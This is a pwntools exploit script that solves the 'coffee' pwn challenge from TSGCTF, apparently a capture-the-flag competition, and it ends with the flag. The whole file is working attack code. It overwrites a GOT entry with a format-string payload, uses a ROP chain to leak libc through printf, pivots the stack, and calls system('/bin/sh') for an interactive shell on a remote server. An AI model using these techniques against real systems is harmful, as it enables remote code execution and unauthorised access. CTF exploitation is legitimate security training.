from pwn import *


binpath = './coffee'
elf = ELF(binpath)
libc = ELF('./libc.so.6')

context.binary = elf
context.terminal = ['tmux', 'split-w', '-h']
# context.log_level = 'DEBUG'

gdbscript = '''
gef
# b main
# just before printf
# b *0x4011eb
# Start ropping
b *0x401201

set $coffee=0x404048

c
'''
# io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)
# io = process(['stdbuf', '-i0', '-o0', '-e0', './coffee'])
io = remote('34.146.101.4', 30002)

addr_pop7 = 0x0000000000401286
addr_pop_rdi = 0x0000000000401293  # : pop rdi ; ret
addr_pop_rsi_r15 = 0x0000000000401291  # : pop rsi ; pop r15 ; ret
addr_pop_rbp = 0x000000000040117d  # : pop rbp ; ret
addr_leave_ret = 0x000000000040121f  # : leave ; ret
addr_ret = 0x000000000040101a  # : ret

addr_data = 0x404038
addr_pivot = addr_data + 0x9d0
addr_s = addr_data

rop = b''
# printf(elf.got['printf'])
rop += p64(addr_pop_rdi)
rop += p64(elf.got['printf'])
rop += p64(elf.plt['printf'])
# scanf("%s", addr_pivot)
rop += p64(addr_pop_rdi)
rop += p64(addr_s)  # %s
rop += p64(addr_pop_rsi_r15)
rop += p64(addr_pivot + 8)
rop += p64(0xdeadbeef)
rop += p64(elf.plt['__isoc99_scanf'])
# stack pivot
rop += p64(addr_pop_rbp)
rop += p64(addr_pivot)
rop += p64(addr_leave_ret)

offset = 6
writes = {
        elf.got['puts']: addr_pop7,
        addr_s: b'%s'
        }
fsb = fmtstr_payload(offset, writes, write_size='int')
assert len(fsb) <= 48

payload = fsb.ljust(48, b'A') + rop

io.sendline(payload)
io.recvuntil(b'\x10')  # lsb of printf is \x10
data = io.recv()

addr_printf = u64((b'\x10' + data).ljust(8, b'\x00'))
addr_libc = addr_printf - libc.symbols['printf']
libc.address = addr_libc
print('addr_libc = 0x{:8x}'.format(addr_libc))
print('addr_system = 0x{:8x}'.format(libc.symbols['system']))

# rop stage 2
rop = b''
rop += p64(addr_pop_rdi)
rop += p64(next(libc.search(b'/bin/sh')))
rop += p64(libc.symbols['system'])

io.sendline(rop)

io.interactive()

# TSGCTF{Uhouho_gori_gori_pwn}
